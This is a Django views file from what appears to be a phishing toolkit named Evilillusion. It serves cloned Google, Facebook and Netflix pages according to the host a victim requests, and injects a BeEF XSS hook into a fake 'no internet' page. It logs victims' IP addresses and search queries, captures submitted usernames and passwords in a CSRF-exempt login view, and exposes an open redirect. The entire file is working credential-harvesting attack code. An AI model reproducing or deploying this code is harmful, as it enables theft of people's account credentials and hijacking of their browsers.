from django.shortcuts import render, redirect
from tldextract import extract
from django.views.decorators.csrf import csrf_exempt
from Evilillusion.func import Google, Facebook, Netflix
from Evilillusion.func import core
from Evilillusion.func import BeefXSS

def index(request):
    user_agent = request.META.get('HTTP_USER_AGENT')
    WEBSITE = request.get_host()
    DOMAIN_NAME = extract(WEBSITE).domain+"."+extract(WEBSITE).suffix
    core.NewClient(domain=DOMAIN_NAME, ip=core.GetClientIP(request))
    tem = BeefXSS('').HookTemplate("errors/mobile_no_internet.html")
    if DOMAIN_NAME == "google.com":
        tem = Google(user_agent=user_agent, is_mobile=request.user_agent.is_mobile).GetHomePage()
    if DOMAIN_NAME == "facebook.com":
        tem = Facebook(user_agent=user_agent, is_mobile=request.user_agent.is_mobile).GetHomePage()
    if DOMAIN_NAME == "netflix.com":
        tem = Netflix(user_agent=user_agent, is_mobile=request.user_agent.is_mobile).GetHomePage()
    return render(request, tem, {})

def search(request):
    user_agent = request.META.get('HTTP_USER_AGENT')
    Word = request.GET.get('q')
    client_ip = core.GetClientIP(request)
    core.print_info(domain=request.get_host(), message=f"{core.MAG}{core.BOLD}{client_ip}{core.YELLOW}{core.BOLD} »» {core.RESET}searched about {core.YELLOW}'{core.BOLD}{core.GREEN}{Word}{core.RESET}{core.YELLOW}'{core.RESET}.")
    tem = Google(user_agent=user_agent, is_mobile=request.user_agent.is_mobile).Search(word=Word)
    return render(request, tem, {})

@csrf_exempt
def login(request):
    WEBSITE = request.get_host()
    DOMAIN_NAME = extract(WEBSITE).domain+"."+extract(WEBSITE).suffix
    core.NewClient(domain=DOMAIN_NAME, ip=core.GetClientIP(request))
    if request.method == "POST":
        fieldOne, fieldTwo = core.GetLoginFields(WEBSITE) # change it to WEBSITE
        USERNAME = request.POST.get(fieldOne)
        PASSWORD = request.POST.get(fieldTwo)
        core.show_creds(domain=DOMAIN_NAME, data={"username": USERNAME, 'password': PASSWORD})
        return redirect("index") # change it to WEBSITE
    else:
        return redirect('index')

def redirect_to(request):
    if request.method == "GET":
        url_to = request.GET.get('url')
        return redirect(url_to)